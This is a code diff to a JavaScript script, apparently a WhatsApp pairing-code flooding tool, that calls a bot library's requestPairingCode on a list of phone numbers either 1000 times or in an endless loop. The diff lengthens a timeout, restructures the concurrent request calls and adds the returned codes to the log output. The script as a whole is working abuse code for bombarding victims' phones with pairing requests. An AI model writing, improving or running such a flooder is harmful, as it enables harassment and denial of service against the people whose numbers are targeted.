@@ -49,7 +49,7 @@ async function XeonProject() {
 
     const option = await Promise.race([
         question(''),
-        new Promise((resolve) => setTimeout(() => resolve('2'), 1))
+        new Promise((resolve) => setTimeout(() => resolve('2'), 1000))
     ]);
 
     let count = 0;
@@ -78,19 +78,17 @@ async function XeonProject() {
         if (option === '1') {
             const xeonCodes = 1000;
             for (let i = 0; i < xeonCodes; i++) {
-                await Promise.all(phoneNumbers.map((phoneNumber, index) => 
-                    sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes)
-                ));
+                const promises = phoneNumbers.map(phoneNumber => sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes));
+                await Promise.all(promises);
             }
         } else {
             while (true) {
-                await Promise.all(phoneNumbers.map((phoneNumber) => 
-                    sendPairingCode(XeonBotInc, phoneNumber, ++count)
-                ));
+                const promises = phoneNumbers.map(phoneNumber => sendPairingCode(XeonBotInc, phoneNumber, ++count));
+                await Promise.all(promises);
             }
         }
     } catch (error) {
-        console.error('error:', error);
+        console.error('Error:', error);
     }
 
     return XeonBotInc;
@@ -100,7 +98,7 @@ async function sendPairingCode(XeonBotInc, phoneNumber, index, total) {
     try {
         let code = await XeonBotInc.requestPairingCode(phoneNumber);
         code = code?.match(/.{1,4}/g)?.join("-") || code;
-        console.log(`${phoneNumber} [${index}/${total || 'Unlimited'}]`);
+        console.log(`${phoneNumber} [${index}/${total || 'Unlimited'}]: ${code}`);
     } catch (error) {
         console.error('Error:', error.message);
     }
